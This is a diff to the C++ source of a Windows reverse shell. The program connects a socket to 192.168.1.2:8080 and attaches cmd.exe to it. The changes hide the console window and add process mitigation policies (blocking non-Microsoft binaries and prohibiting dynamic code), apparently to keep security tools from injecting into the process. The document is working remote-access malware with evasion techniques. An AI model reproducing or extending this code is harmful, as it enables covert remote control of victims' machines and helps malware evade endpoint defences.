@@ -46,12 +46,12 @@ void shell(wchar_t* ip, int port)
         }
 
         STARTUPINFOEXA si;
-        PROCESS_INFORMATION pi;
         ZeroMemory(&si, sizeof(si));
         si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
         si.StartupInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW | EXTENDED_STARTUPINFO_PRESENT);
         si.StartupInfo.hStdInput = si.StartupInfo.hStdOutput = si.StartupInfo.hStdError = reinterpret_cast<HANDLE>(my_socket);
-
+        si.StartupInfo.wShowWindow = SW_HIDE;
+    	
         SIZE_T size = 0;
         InitializeProcThreadAttributeList(nullptr, 1, 0, &size);
         si.lpAttributeList = static_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(HeapAlloc(
@@ -64,6 +64,7 @@ void shell(wchar_t* ip, int port)
         DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
         UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), nullptr, nullptr);
 
+        PROCESS_INFORMATION pi;
         // ReSharper disable once CppFunctionalStyleCast
         CreateProcessA(nullptr, LPSTR(R"(C:\Windows\System32\cmd.exe)"), nullptr, nullptr, TRUE, 0, nullptr, nullptr, reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);
         WaitForSingleObject(pi.hProcess, INFINITE);
@@ -87,6 +88,13 @@ void shell(wchar_t* ip, int port)
 
 int main()
 {
+    PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy;
+    ZeroMemory(&policy, sizeof(policy));
+    policy.ProhibitDynamicCode = 1;
+    if (SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &policy, sizeof(policy)) == false) {
+        return 1;
+    }
+
 	wchar_t ip[12] = L"192.168.1.2";
     int port = 8080;
     shell(ip, port);
